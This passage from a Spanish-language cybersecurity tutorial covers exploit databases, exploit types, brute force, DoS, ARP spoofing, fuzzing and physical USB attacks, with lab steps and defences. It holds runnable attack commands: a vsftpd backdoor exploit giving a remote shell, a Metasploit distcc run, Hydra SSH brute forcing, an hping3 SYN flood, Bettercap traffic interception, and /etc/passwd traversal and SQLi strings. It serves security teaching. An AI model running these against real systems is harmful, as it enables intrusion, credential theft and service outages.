| Herramienta común | Metasploit Framework                                 |
| Uso real          | Auditoría de seguridad, pentesting ético             |

---

[🔼](#índice)

---

## **785. Bases de datos de exploitsy**

### ✅ Definición sencilla:

Una **base de datos de exploits** es un repositorio público (o privado) donde se recopilan **exploits** —es decir, **códigos o técnicas que aprovechan vulnerabilidades conocidas en sistemas, aplicaciones o servicios.**

Estas bases incluyen:

- **Información sobre vulnerabilidades**
- **Exploit code listo para usar**
- **Detalles técnicos del fallo**
- **Recomendaciones de mitigación**

---

### 🎯 ¿Para qué se usan?

- Realizar **pruebas de penetración éticas**
- **Estudiar y aprender** técnicas de explotación
- Ver si un sistema es vulnerable
- Generar informes de seguridad
- Diseñar reglas de detección (IDS, SIEM, etc.)

---

### 📚 Ejemplos de bases de datos de exploits populares

| Base de datos             | Descripción                                                                     |
| ------------------------- | ------------------------------------------------------------------------------- |
| **Exploit-DB**            | Repositorio público muy completo, usado por pentesters y CTF                    |
| **Metasploit Framework**  | Framework con exploits listos para ejecutar con payloads                        |
| **Packet Storm Security** | Repositorio con exploits, parches, y herramientas de hacking                    |
| **GitHub**                | Muchos exploits publicados por investigadores están aquí                        |
| **NVD (NIST)**            | Base de datos de vulnerabilidades, enlaza con exploits (no siempre directos)    |
| **0day.today**            | Sitio donde se venden y comparten (algunos) exploits de día cero (⚠️ legalidad) |

---

### 🔧 ¿Cómo acceder o instalar una base de datos de exploits?

---

#### 🔹 Opción 1: Usar Exploit-DB localmente (Kali Linux)

Exploit-DB viene con Kali Linux como base de datos de texto.

##### ✅ Instalación (si no está):

```bash
sudo apt update
sudo apt install exploitdb
```

##### ✅ Usar:

```bash
searchsploit apache
```

Ejemplo:

```bash
searchsploit wordpress
```

Resultado típico:

```
WordPress < 5.7 - Remote Code Execution       | php/webapps/49877.py
```

---

#### 🔹 Opción 2: Usar Exploit-DB en línea

👉 Sitio web: [https://www.exploit-db.com/](https://www.exploit-db.com/)

Puedes buscar por:

- Nombre del software
- CVE
- Plataforma (Windows, Linux, etc.)
- Tipo (RCE, DoS, LFI, etc.)

---

#### 🔹 Opción 3: Usar Metasploit Framework

Metasploit incluye cientos de exploits y payloads que puedes buscar y ejecutar.

```bash
msfconsole
```

Buscar:

```bash
search samba
```

Usar:

```bash
use exploit/unix/misc/distcc_exec
set RHOST 192.168.1.20
set LHOST 192.168.1.100
run
```

---

#### 🔹 Opción 4: Packet Storm

👉 Sitio web: [https://packetstormsecurity.com/](https://packetstormsecurity.com/)

Ahí puedes buscar exploits por fecha, nombre, tipo, y descargar los archivos directamente.

---

### ✅ Ejemplo completo paso a paso

---

#### 🎯 Objetivo:

Usar una base de datos de exploits para encontrar y probar un exploit contra una aplicación vulnerable en una máquina de laboratorio (Metasploitable 2).

---

#### Paso 1: Buscar exploit con Exploit-DB

```bash
searchsploit vsftpd
```

Resultado:

```
vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/17491.py
```

---

#### Paso 2: Copiar el exploit a tu directorio de trabajo

```bash
searchsploit -m unix/remote/17491.py
```

---

#### Paso 3: Leer el código

```bash
cat 17491.py
```

Puedes editar el exploit si es necesario.

---

#### Paso 4: Ejecutar el exploit

```bash
python3 17491.py 192.168.1.105
```

Si la máquina es vulnerable, se abre una shell remota.

---

#### Paso 5: Verificar acceso

```bash
whoami
uname -a
```

---

### 📌 Buenas prácticas

- Usa estas bases en **entornos controlados/laboratorios**.
- Siempre verifica que el exploit **corresponde a la versión del software objetivo**.
- Lee el código antes de ejecutarlo: puede haber código malicioso.
- **No uses estos exploits contra sistemas que no te pertenecen o sin autorización.**

---

### 🧠 Resumen

| Concepto                      | Significado                                                    |
| ----------------------------- | -------------------------------------------------------------- |
| Exploit Database (Exploit-DB) | Repositorio de exploits públicos de vulnerabilidades conocidas |
| searchsploit                  | Herramienta de búsqueda local para Exploit-DB                  |
| Metasploit                    | Framework que automatiza explotación con payloads              |
| Packet Storm                  | Sitio con exploits, parches y documentos de seguridad          |
| GitHub                        | Lugar donde se publican nuevos exploits por investigadores     |

---

[🔼](#índice)

---

## **786. Tipos de exploits**

### 🧨 ¿Qué es un Exploit? (Resumen rápido)

Un **exploit** es un programa o código que se aprovecha de una **vulnerabilidad** en un software o sistema para realizar acciones no deseadas (como acceder, ejecutar código, etc.).

> 🧠 Ejemplo sencillo: Si una app deja una puerta abierta por error, el exploit entra por esa puerta para tomar control.

---

### 🧩 Tipos de Exploits (Clasificados)

Existen muchos tipos, pero se suelen clasificar por **cómo**, **dónde** y **qué** atacan.

---

#### 🧱 1. **Local Exploits**

##### 📌 ¿Qué son?

Exploits que necesitan acceso local al sistema (como un usuario regular) y se usan para **elevar privilegios**.

##### ✅ Ejemplo:

- _Dirty COW_ (Linux): Eleva permisos de un usuario común a root.

```bash
CVE-2016-5195
```

##### 🛠️ Uso típico:

```bash
gcc dirtycow.c -o dirtycow
./dirtycow
```

---

#### 🌐 2. **Remote Exploits**

##### 📌 ¿Qué son?

Se ejecutan **remotamente**, contra una máquina vulnerable a través de una red o Internet.

##### ✅ Ejemplo:

- _MS17-010_ (EternalBlue) → Vulnerabilidad en SMB de Windows

```bash
CVE-2017-0144
```

Se puede usar para ejecutar código remotamente en sistemas Windows antiguos.

---

#### 🌍 3. **Web Exploits**

##### 📌 ¿Qué son?

Exploits que atacan aplicaciones web vulnerables.

##### ✅ Ejemplos:

- **SQL Injection**
- **Cross-Site Scripting (XSS)**
- **Remote File Inclusion (RFI)**

```http
http://victima.com/page.php?file=../../etc/passwd
```

##### 🧪 Herramientas:

- Burp Suite
- OWASP ZAP
- SQLmap

---

#### 🔐 4. **Privilege Escalation Exploits**

Se usan para **subir de permisos** una vez que ya tienes acceso limitado.

Ejemplo:

```bash
sudo -l
```

Si hay una mala configuración, puedes explotar y convertirte en root.

---

#### 💣 5. **Denial of Service (DoS)**

Explota fallas para **colapsar** un sistema o aplicación y hacerla inutilizable.

##### ✅ Ejemplo:

- Enviar muchos paquetes malformados a un servicio → se cierra/crashea.

```bash
ping -s 65507 IP_VICTIMA
```

---

#### 🤖 6. **Zero-Day Exploits**

Exploits para vulnerabilidades **desconocidas por el fabricante**. Muy peligrosos.

⚠️ Son raros, valiosos y muchas veces **ilegales de usar sin autorización**.

---

### 🛠️ ¿Cómo se instalan o se usan?

Los exploits suelen venir como scripts o dentro de herramientas. Algunas opciones:

---

#### 🔹 1. **Metasploit Framework** (Incluye muchos tipos de exploits)

##### ✅ Instalación en Kali Linux (ya viene instalado)

```bash
msfconsole
```

##### ✅ En otras distros:

```bash
sudo apt update
sudo apt install metasploit-framework
```

---

#### 🔹 2. **Exploit-DB + Searchsploit**

Instalar y usar:

```bash
sudo apt install exploitdb
searchsploit apache
```

---

#### 🔹 3. Desde GitHub

```bash
git clone https://github.com/repo/exploit-example.git
cd exploit-example
python3 exploit.py
```

---

### 🧪 Ejemplo práctico completo

Vamos a usar un **exploit remoto** para atacar un servicio vulnerable (vsftpd 2.3.4 en Metasploitable 2).

---

#### 🎯 Objetivo: Obtener una shell usando un exploit de Exploit-DB

---

#### ✅ Paso 1: Buscar exploit

```bash
searchsploit vsftpd
```

Resultado:

```
vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/17491.py
```

---

#### ✅ Paso 2: Copiar el exploit

```bash
searchsploit -m 17491.py
```

---

#### ✅ Paso 3: Ejecutar el exploit

```bash
python3 17491.py 192.168.1.105
```

Si la máquina es vulnerable, se abre una shell remota.

---

#### ✅ Paso 4: Verificar acceso

```bash
whoami
```

---

### 🧠 Resumen final

| Tipo de Exploit      | ¿Qué hace?                                   | Ejemplo             |
| -------------------- | -------------------------------------------- | ------------------- |
| Local                | Escalar permisos en la misma máquina         | Dirty COW           |
| Remote               | Ejecutar código desde otra máquina           | EternalBlue         |
| Web                  | Explotar aplicaciones web                    | SQLi, XSS, LFI      |
| Privilege Escalation | Pasar de usuario normal a administrador/root | Exploits SUID, sudo |
| Denial of Service    | Apagar/colapsar servicios                    | Ping of Death       |
| Zero-Day             | Atacar vulnerabilidades desconocidas         | No públicas         |

---

[🔼](#índice)

---

## **787. Ataques de fuerza bruta**

### 🧠 ¿Qué es un Ataque de Fuerza Bruta?

Un **ataque de fuerza bruta** es una técnica en la que un atacante intenta **adivinar contraseñas o claves secretas** probando **todas las combinaciones posibles** hasta encontrar la correcta.

> ⚠️ Es como intentar abrir una cerradura probando todas las llaves una por una.

---

#### 🔍 ¿Dónde se usan los ataques de fuerza bruta?

- Inicios de sesión web (usuarios/contraseñas)
- Servicios SSH, FTP, RDP
- Archivos comprimidos con contraseña (ZIP, RAR)
- Formularios de acceso en aplicaciones móviles o web
- Cifrado de contraseñas (hashes)

---

### 📦 Tipos de Fuerza Bruta

| Tipo                        | Descripción                                                       |
| --------------------------- | ----------------------------------------------------------------- |
| **Clásico**                 | Prueba todas las combinaciones posibles. Lento pero seguro.       |
| **Diccionario**             | Usa una lista de palabras comunes (wordlist). Más rápido.         |
| **Fuerza bruta híbrida**    | Combina diccionario + mutaciones (añade números, símbolos, etc.). |
| **Ataque por credenciales** | Usa pares usuario/contraseña conocidos o filtrados                |

---

### 🛠️ Herramientas populares para fuerza bruta

| Herramienta         | Uso principal                             | Sistema Operativo |
| ------------------- | ----------------------------------------- | ----------------- |
| **Hydra**           | Ataques a servicios (SSH, FTP, etc.)      | Linux/Windows     |
| **Medusa**          | Similar a Hydra, muy rápida               | Linux             |
| **Burp Suite**      | Ataques de diccionario a formularios web  | Windows/Linux/Mac |
| **John the Ripper** | Cracking de contraseñas cifradas (hashes) | Linux/Mac         |
| **Hashcat**         | Cracking de hashes con GPU                | Windows/Linux     |

---

### 💿 ¿Cómo instalar Hydra? (Ejemplo con Kali Linux)

Hydra ya viene en Kali Linux, pero si no lo tienes:

```bash
sudo apt update
sudo apt install hydra
```

Verifica la instalación:

```bash
hydra -h
```

---

### 📄 Crear una lista de contraseñas (diccionario)

Puedes usar **wordlists** listas como:

- `/usr/share/wordlists/rockyou.txt`
- O crear una tú mismo:

```bash
echo -e "123456\nadmin\npassword\nadmin123" > lista.txt
```

---

### ✅ Ejemplo completo paso a paso: Ataque de fuerza bruta SSH con Hydra

#### 🎯 Objetivo:

Probar un ataque de diccionario sobre un servidor **SSH** en un entorno controlado (como Metasploitable 2 o una VM Ubuntu vulnerable).

---

#### 🛠️ Paso 1: Verificar que el servicio SSH está activo en la víctima

```bash
nmap -p 22 192.168.1.105
```

> Si el puerto 22 está abierto, podemos atacar.

---

#### 🛠️ Paso 2: Crear lista de contraseñas

```bash
echo -e "123456\npassword\nadmin\nadmin123" > passwords.txt
```

---

#### 🛠️ Paso 3: Ejecutar Hydra

```bash
hydra -l usuario -P passwords.txt ssh://192.168.1.105
```

**Explicación:**

- `-l usuario`: Usuario objetivo
- `-P passwords.txt`: Archivo con contraseñas
- `ssh://IP`: Servicio a atacar

---

#### ✅ Resultado posible:

```bash
[22][ssh] host: 192.168.1.105 login: usuario password: admin123
```

¡Hydra ha encontrado la contraseña correcta!

---

### 🧯 ¿Cómo defenderse?

| Medida de defensa                 | Descripción                                  |
| --------------------------------- | -------------------------------------------- |
| Limitar intentos de login         | Ej: bloquear cuenta tras 3 intentos fallidos |
| Usar contraseñas seguras          | Largas, complejas, no repetidas              |
| Autenticación multifactor         | Segundo paso (ej. SMS, app)                  |
| Captchas                          | Impiden bots en formularios web              |
| Firewall o Fail2ban               | Bloquea IPs con muchos intentos fallidos     |
| Desactivar servicios innecesarios | Quitar FTP, SSH si no se usan                |

---

### 🧠 Resumen

| Concepto            | Detalle                                               |
| ------------------- | ----------------------------------------------------- |
| ¿Qué es?            | Probar muchas contraseñas hasta encontrar la correcta |
| Tipos               | Clásico, diccionario, híbrido                         |
| Herramientas        | Hydra, Burp Suite, John, Hashcat                      |
| Instalación (Hydra) | `sudo apt install hydra`                              |
| Ejemplo             | `hydra -l user -P passlist.txt ssh://IP`              |

---

[🔼](#índice)

---

## **788. Ataques de denegación de servicio**

### 🧠 ¿Qué es un Ataque de Denegación de Servicio (DoS)?

Un **ataque de denegación de servicio** busca hacer que un sistema, servicio o red quede **inaccesible para usuarios legítimos** al **saturarlo con tráfico falso o malicioso**.

> 🎯 Objetivo: Tumbar (caer) un sitio web, servidor o red, sin necesidad de vulnerabilidades.

---

### 🔀 Tipos de Ataques DoS y DDoS

#### 🧱 1. **DoS (Denial of Service)**

- Ataque desde una **sola fuente (una máquina)**
- Fácil de detectar y bloquear
- Ideal para entornos de laboratorio

#### 🌐 2. **DDoS (Distributed DoS)**

- Ataque desde **múltiples dispositivos (botnets)**
- Más difícil de mitigar
- Mucho más potente

---

### ⚔️ Tipos de ataques DoS/DDoS más comunes

| Tipo de ataque            | Descripción breve                                                              |
| ------------------------- | ------------------------------------------------------------------------------ |
| **Flooding (inundación)** | Enviar una enorme cantidad de peticiones falsas para saturar recursos          |
| **SYN Flood**             | Aprovecha el proceso de conexión TCP para agotar memoria                       |
| **UDP Flood**             | Envía muchos paquetes UDP a puertos aleatorios                                 |
| **HTTP Flood**            | Simula navegación legítima masiva (como bots que piden muchas páginas)         |
| **Ping of Death**         | Envío de paquetes ICMP malformados (antiguamente efectivo)                     |
| **Slowloris**             | Mantiene muchas conexiones abiertas, pero incompletas, consumiendo el servidor |

---

### 🛠️ Herramientas populares para ataques DoS (educativos y controlados)

| Herramienta    | Tipo          | Uso principal                 |
| -------------- | ------------- | ----------------------------- |
| **LOIC**       | GUI, simple   | HTTP, TCP y UDP flood         |
| **HOIC**       | GUI, avanzado | HTTP DoS                      |
| **hping3**     | Terminal      | TCP/UDP/ICMP flood, SYN flood |
| **Slowloris**  | Terminal      | DoS de baja tasa              |
| **Metasploit** | Framework     | Simulación de DoS             |
| **GoldenEye**  | Terminal      | HTTP DoS (efectivo vs Apache) |

> ⚠️ **IMPORTANTE**: Solo usar estas herramientas en **laboratorios propios o con autorización**. Usarlas contra sistemas reales sin permiso es **ilegal**.

---

### 🧪 ¿Cómo instalar herramientas para pruebas de DoS?

#### 🔹 1. Instalar hping3 en Kali Linux

```bash
sudo apt update
sudo apt install hping3
```

Verificar:

```bash
hping3 --version
```

---

#### 🔹 2. Instalar Slowloris (ataque HTTP lento)

```bash
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py <IP_VICTIMA>
```

---

### 🧪 Laboratorio de prueba

#### 🎯 Objetivo: Simular un DoS con hping3 a un servidor web en VirtualBox

##### 🖥️ Requisitos:

- Kali Linux (atacante)
- Metasploitable 2 o un servidor Apache (víctima)
- Ambas máquinas en red NAT o interna

---

### ✅ Ejemplo completo: Ataque SYN Flood con hping3

#### Paso 1: Verificar que el servidor Apache esté corriendo

En la víctima:

```bash
sudo service apache2 start
```

Verifica en navegador: `http://192.168.1.105`

---

#### Paso 2: Ejecutar ataque desde Kali con `hping3`

```bash
sudo hping3 -S --flood -V -p 80 192.168.1.105
```

**Explicación:**

- `-S`: Envia paquetes TCP SYN (como si se quisiera iniciar una conexión)
- `--flood`: Inunda el destino sin esperar respuesta
- `-V`: Verbose (muestra más info)
- `-p 80`: Puerto del servidor web
- `192.168.1.105`: IP de la víctima

---

#### Paso 3: Ver comportamiento del servidor

Durante el ataque:

- El sitio web puede volverse **muy lento o no responder**
- Con `top` o `netstat` puedes ver conexiones abiertas en la víctima

---

#### Paso 4: Detener el ataque

Presiona `Ctrl + C` en Kali para frenar el ataque.

---

### 🧯 ¿Cómo protegerse de un ataque DoS/DDoS?

| Medida defensiva            | Descripción                                                                 |
| --------------------------- | --------------------------------------------------------------------------- |
| Firewalls (iptables, UFW)   | Bloquear IPs sospechosas                                                    |
| **Fail2Ban**                | Bloquea IPs con muchas peticiones fallidas                                  |
| **Rate Limiting**           | Limitar número de peticiones por IP                                         |
| **CDN con protección DDoS** | Cloudflare, AWS Shield, etc.                                                |
| **Monitorización activa**   | Usar herramientas como `ntop`, `iftop`, `Wireshark` para detectar anomalías |
| **Balanceo de carga**       | Distribuir tráfico en múltiples servidores                                  |

---

### ✅ Resumen

| Concepto              | Detalles breves                                |
| --------------------- | ---------------------------------------------- |
| ¿Qué es?              | Ataque para dejar un sistema fuera de servicio |
| Tipos                 | Flood, SYN Flood, Slowloris, HTTP Flood        |
| Herramientas          | hping3, LOIC, HOIC, Slowloris, GoldenEye       |
| Prueba de laboratorio | `hping3 -S --flood -p 80 IP`                   |
| Protección            | Firewall, rate limiting, Fail2Ban, CDN         |

---

[🔼](#índice)

---

## **789. Spoofing**

### 🧠 ¿Qué es el Spoofing?

**Spoofing** significa **suplantación de identidad**. En ciberseguridad, es una técnica donde un atacante **finge ser otra persona, dispositivo o sistema** para engañar y obtener acceso no autorizado o información.

> 🎭 Spoofing = Hacerse pasar por otro para engañar.

---

### 🧩 Tipos comunes de Spoofing

| Tipo de Spoofing       | Qué suplantan                 | Ejemplo sencillo                               |
| ---------------------- | ----------------------------- | ---------------------------------------------- |
| **IP Spoofing**        | Dirección IP                  | Enviar paquetes como si vinieran de otra IP    |
| **ARP Spoofing**       | Dirección MAC en red local    | Interceptar tráfico en una red LAN             |
| **DNS Spoofing**       | Servidor DNS o respuestas DNS | Redirigir a sitios falsos                      |
| **Email Spoofing**     | Dirección de correo           | Mandar correos como si fueran de otra persona  |
| **Web Spoofing**       | Sitios web falsos             | Sitios que imitan bancos, redes sociales, etc. |
| **Caller ID Spoofing** | Número de teléfono            | Llamadas falsas que aparentan ser de confianza |

---

### 🧪 Enfoque de laboratorio: **ARP Spoofing**

Nos enfocaremos en **ARP Spoofing**, uno de los más comunes y fáciles de entender en redes locales.

---

### 📚 ¿Qué es ARP Spoofing?

El **Protocolo ARP** traduce direcciones IP en direcciones MAC en una red local.

Un atacante puede **enviar respuestas ARP falsas** a una víctima y al router para que el tráfico pase por su equipo (ataque "Man in the Middle").

> ⚠️ Así, el atacante puede espiar, modificar o redirigir el tráfico.

---

### 🛠️ Herramientas para ARP Spoofing

| Herramienta   | Descripción                      |
| ------------- | -------------------------------- |
| **Ettercap**  | Ataques Man in the Middle (MITM) |
| **Bettercap** | Moderno, potente, modular        |
| **arpspoof**  | Parte del paquete `dsniff`       |
| **Wireshark** | Analiza tráfico capturado        |

---

### 🐧 Instalación de herramientas en Kali Linux

#### 🔹 Ettercap

```bash
sudo apt update
sudo apt install ettercap-graphical
```

Iniciar:

```bash
sudo ettercap -G
```

#### 🔹 Bettercap (alternativa más moderna)

```bash
sudo apt install bettercap
```

---

### 🧪 Laboratorio: Ataque ARP Spoofing con Bettercap

#### 🎯 Objetivo:

- Suplantar al router y a una víctima en red local
- Interceptar su tráfico con **Bettercap**
- Analizarlo con **Wireshark**

---

### 🛠️ Preparación del laboratorio

1. 🖥️ **Máquina atacante**: Kali Linux
2. 🎯 **Víctima**: Windows/Linux conectado a la misma red (virtual o real)
3. 🌐 Asegúrate de que ambas máquinas estén en la misma red

Ver IPs:

```bash
ip a      # en Kali
ipconfig  # en Windows víctima
```

---

#### Paso 1: Iniciar Bettercap

```bash
sudo bettercap -iface eth0
```

> Reemplaza `eth0` con tu interfaz de red si es distinta (usa `ip a` para verla)

---

#### Paso 2: Escanear la red

Dentro de Bettercap:

```bash
net.probe on
```

Esto buscará todas las máquinas conectadas a tu red local.

---

#### Paso 3: Hacer ARP Spoofing

Busca IP de la víctima (ejemplo: 192.168.1.10) y el gateway/router (ejemplo: 192.168.1.1).

```bash
set arp.spoof.targets 192.168.1.10
arp.spoof on
net.sniff on
```

Ahora Bettercap **envenenará la tabla ARP** de la víctima y el router, colocándose entre ambos.

---

#### Paso 4: Ver tráfico capturado

Abre otra terminal con `wireshark` o `tcpdump` y observa las conexiones que pasan por ti.

También puedes capturar contraseñas de sitios sin HTTPS, sesiones HTTP, etc.

---

### ⚠️ ¿Cómo protegerse del spoofing?

| Defensa                          | Descripción                                            |
| -------------------------------- | ------------------------------------------------------ |
| **HTTPS**                        | Cifra la información, aunque haya un atacante en medio |
| **ARP Inspection (en switches)** | Solo permite ARP válidas                               |
| **IP/MAC binding (estático)**    | Asociar IPs fijas a MACs conocidas                     |
| **VPN**                          | Protege tráfico en redes no confiables                 |
| **Antivirus/firewalls**          | Detectan comportamientos sospechosos                   |

---

### ✅ Resumen

| Concepto     | Detalles clave                                  |
| ------------ | ----------------------------------------------- |
| Spoofing     | Suplantar identidad (IP, MAC, DNS, etc.)        |
| ARP Spoofing | Redirige tráfico engañando con direcciones MAC  |
| Herramientas | Bettercap, Ettercap, Wireshark, arpspoof        |
| Laboratorio  | Kali + víctima en red local                     |
| Instalación  | `sudo apt install bettercap ettercap-graphical` |

---

[🔼](#índice)

---

## **790. Fuzzing**

### 🧠 ¿Qué es el Fuzzing?

**Fuzzing** (o Fuzz Testing) es una técnica de pruebas de seguridad que **envía grandes cantidades de datos aleatorios, inesperados o inválidos a una aplicación**, con el objetivo de encontrar **fallos, errores o vulnerabilidades**.

> 🎯 El objetivo del fuzzing es provocar errores inesperados que puedan llevar a vulnerabilidades como **crashes, inyecciones, buffer overflows, etc.**

---

### 🧩 ¿Cómo funciona el Fuzzing?

1. Se selecciona un objetivo (programa, API, sitio web, etc.)
2. Se envían entradas automáticas o aleatorias (fuzz) al objetivo.
3. Se monitorea el comportamiento:

   - ¿Se cae el programa?
   - ¿Responde mal?
   - ¿Filtra información?

---

### 🎯 Ejemplos simples de Fuzzing

#### ✅ Entrada esperada:

```http
GET /login?user=admin&pass=1234 HTTP/1.1
```

#### ❌ Entrada con fuzz (ejemplo):

```http
GET /login?user=<script>alert(1)</script>&pass=' OR '1'='1 HTTP/1.1
```

---

### 🔍 Tipos de Fuzzing

| Tipo de fuzzing      | Explicación breve                                         |
| -------------------- | --------------------------------------------------------- |
| **Black Box**        | No se conoce el código interno                            |
| **White Box**        | Se tiene acceso al código fuente                          |
| **Gray Box**         | Se tiene acceso parcial al código o arquitectura          |
| **Mutation-based**   | Modifica entradas válidas (añadir símbolos, cambiar bits) |
| **Generation-based** | Crea nuevas entradas desde cero según un formato          |

---

### 🛠️ Herramientas populares para Fuzzing

| Herramienta                  | Uso principal                        |
| ---------------------------- | ------------------------------------ |
| **AFL (American Fuzzy Lop)** | Fuzzing binarios, rápido y muy usado |
| **Burp Suite**               | Fuzzing de aplicaciones web          |
| **ffuf**                     | Fuzzing de directorios y URLs        |
| **wfuzz**                    | Fuzzing HTTP                         |
| **Peach Fuzzer**             | Profesional, completo                |
| **Boofuzz**                  | Basado en Python, para protocolos    |
| **Radamsa**                  | Mutación rápida de datos             |

---

### 🐧 Instalación de herramientas

#### 🔹 Instalar `ffuf` (muy fácil y útil para web fuzzing)

```bash
sudo apt update
sudo apt install ffuf
```

Verificar instalación:

```bash
ffuf -h
```

---

#### 🔹 Instalar `AFL` para fuzzing de binarios

```bash
sudo apt install afl
```

Verificar:

```bash
afl-fuzz --help
```

---

### 🧪 Laboratorio básico de Fuzzing Web con `ffuf`

#### Objetivo:

Descubrir **archivos o directorios ocultos** en un sitio web (por ejemplo, un CTF o aplicación vulnerable).

#### Requisitos:

- Tener un servidor web objetivo (por ejemplo, OWASP Juice Shop, DVWA, o un servidor en localhost).
- Un diccionario de palabras. Usa el de SecLists:

```bash
sudo apt install seclists
```

Ubicación común del diccionario:

```
/usr/share/seclists/Discovery/Web-Content/common.txt
```

---

#### 🔧 Comando básico:

```bash
ffuf -u http://192.168.1.100/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Explicación:**

- `-u`: URL del objetivo. `FUZZ` es donde se inyecta cada palabra.
- `-w`: Diccionario con palabras para probar.

---

#### 🎯 Resultado esperado:

Si el servidor tiene un archivo como `/admin`, el escaneo lo encontrará:

```bash
/admin            [Status: 200, Size: 1234]
/backup           [Status: 403, Size: 0]
```

---

### ✅ Ejemplo completo: Fuzzing web con ffuf

#### Paso 1: Montar entorno de prueba

Puedes usar OWASP Juice Shop o DVWA en localhost:

```bash
docker run -d -p 3000:3000 bkimminich/juice-shop
```

Accede a: `http://localhost:3000`

---

#### Paso 2: Ejecutar fuzzing con ffuf

```bash
ffuf -u http://localhost:3000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

---

#### Paso 3: Interpretar resultados

Mira el código de estado HTTP (`200`, `403`, etc.). Los directorios existentes responderán con códigos distintos a `404`.

---

### 🔐 ¿Qué se puede encontrar con Fuzzing?

- **Rutas ocultas**: `/admin`, `/config`, `/backup`
- **Parámetros vulnerables**: `?id=`, `?file=`
- **Errores del servidor**: respuestas `500` (Internal Server Error)
- **Fallos lógicos**: saltos de autenticación, XSS, SQLi, etc.

---

### ⚠️ Consideraciones legales

🚫 **Nunca hagas fuzzing contra sistemas sin autorización**. Solo hazlo en:

- Laboratorios locales
- Sistemas de pruebas
- Plataformas legales como Hack The Box, TryHackMe o Bug Bounty autorizados

---

### 🧯 ¿Cómo protegerse del fuzzing?

- Validar entradas del usuario (input sanitization)
- Configurar respuestas homogéneas (no revelar rutas con errores distintos)
- Usar WAF (Web Application Firewall)
- Revisar logs para detectar comportamientos automatizados

---

### 📌 Resumen

| Punto clave  | Explicación rápida                                   |
| ------------ | ---------------------------------------------------- |
| ¿Qué es?     | Técnica para detectar fallos con entradas aleatorias |
| Tipos        | IP, DNS, ARP, Email, Web, API                        |
| Herramientas | `ffuf`, `AFL`, `wfuzz`, `Boofuzz`                    |
| Uso práctico | Buscar rutas ocultas, parámetros, errores            |
| Instalación  | `sudo apt install ffuf afl seclists`                 |

---

[🔼](#índice)

---

## **791. Técnicas de ataques físicos**

### 🧠 ¿Qué son los ataques físicos en ciberseguridad?

Los **ataques físicos** son aquellos en los que el atacante necesita **acceso físico al sistema o infraestructura** para comprometer la seguridad. Estos ataques no siempre requieren conocimientos técnicos avanzados, pero sí implican **estar presente físicamente en el lugar** donde se encuentra el objetivo (servidor, router, PC, etc.).

> 🎯 En vez de atacar a distancia, se ataca **tocando o manipulando directamente** el dispositivo.

---

### 🧩 Tipos de ataques físicos (con ejemplos sencillos)

| Tipo de ataque físico            | Ejemplo real o común                                       |
| -------------------------------- | ---------------------------------------------------------- |
| **Robo de dispositivos**         | Robar una laptop para acceder a los datos                  |
| **USB Malicioso**                | Insertar un USB con malware en un PC desatendido           |
| **Cold Boot Attack**             | Apagar PC, reiniciar desde USB, extraer claves de RAM      |
| **Ataque de Hardware Keylogger** | Instalar un keylogger físico entre el teclado y el PC      |
| **Evil Maid Attack**             | Acceder al portátil de un usuario mientras duerme en hotel |
| **Acceso a puertos abiertos**    | Conectar a puertos de red o consola física (ej. router)    |
| **Ataques a cámaras/BIOS**       | Manipular la BIOS, arrancar desde USB o cambiar la cámara  |

---

### 🔧 ¿Cómo se instala o realiza un ataque físico?

Para entenderlo, pensemos como lo haría un atacante en el mundo real:

#### 🔹 Escenario 1: USB Malicioso

1. El atacante deja un USB infectado en un estacionamiento o sala de espera.
2. Un usuario curioso lo conecta a su PC.
3. El malware se ejecuta automáticamente (si hay autorun o vulnerabilidades).
4. El atacante gana acceso remoto o roba datos.

> 🧪 Se puede hacer con herramientas como **Rubber Ducky**, **USB Rubber Ducky**, o **BadUSB**.

---

#### 🔹 Escenario 2: Keylogger físico

1. El atacante accede al PC cuando nadie lo ve.
2. Conecta un pequeño hardware entre el teclado y el puerto USB.
3. Este dispositivo graba cada tecla que el usuario presiona.
4. Luego, el atacante recupera el dispositivo y extrae las contraseñas.

---

#### 🔹 Escenario 3: Cold Boot Attack

1. Se apaga el PC forzadamente.
2. Se reinicia con una USB que corre una herramienta de volcado de memoria.
3. Se intenta recuperar claves de cifrado aún cargadas en la RAM.

> Este ataque es más técnico, pero muestra cómo incluso **RAM puede ser atacada físicamente**.

---

### ⚙️ Herramientas utilizadas en ataques físicos

| Herramienta/Dispositivo   | Uso principal                                   |
| ------------------------- | ----------------------------------------------- |
| **Rubber Ducky**          | USB que simula teclado, ejecuta comandos        |
| **Bash Bunny**            | Más avanzado, puede automatizar exploits        |
| **Keyloggers físicos**    | Captura pulsaciones del teclado                 |
| **Live USB con Kali**     | Arrancar PC desde USB para manipular el sistema |
| **Multímetro / Hardware** | Modificar chips, puertos, leer EEPROM           |

---

### 🛡️ ¿Cómo protegerse contra ataques físicos?

| Medida de defensa                      | Qué hace                                            |
| -------------------------------------- | --------------------------------------------------- |
| **Bloqueo de BIOS con contraseña**     | Evita arranque desde USB o manipulación del sistema |
| **Cifrado de disco (BitLocker, LUKS)** | Protege datos si el equipo es robado                |
| **Puertos USB bloqueados**             | Impide conexión de dispositivos no autorizados      |
| **Cámaras de seguridad**               | Detecta intrusos                                    |
| **Bloqueo automático de pantalla**     | Cierra sesión tras inactividad                      |
| **Almacenamiento seguro**              | Guardar servidores o PCs críticos bajo llave        |

---

### ✅ Ejemplo completo: Ataque físico simulado con USB malicioso (entorno controlado)

#### 🎯 Objetivo:

Simular un **ataque con USB Rubber Ducky** para ejecutar comandos automáticos al insertarlo.

---

#### 🔧 Requisitos:

- Un **USB Rubber Ducky** real o simulado
- Un **PC con Windows o Linux**
- El software **DuckEncoder** para crear scripts

---

#### 🧪 Paso a paso:

1. 📥 Instalar DuckEncoder (si usas el original):

```bash
git clone https://github.com/hak5darren/USB-Rubber-Ducky.git
cd USB-Rubber-Ducky/Encoder
```

2. ✍️ Crear un script Ducky:

```txt
DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 500
STRING Este equipo ha sido comprometido.
ENTER
```

3. 🧃 Codificar el script:

```bash
java -jar duckencode.jar -i script.txt -o inject.bin
```

4. 📦 Copiar el archivo `inject.bin` al USB Rubber Ducky.

5. 🔌 Conectar el USB al PC de la víctima.

> 🧨 El script se ejecutará automáticamente como si lo escribiera el teclado.

---

### 🧠 Alternativa: Simulación sin hardware (con Python)

Si no tienes un Rubber Ducky, puedes **simular el ataque** con Python usando `pyautogui`:

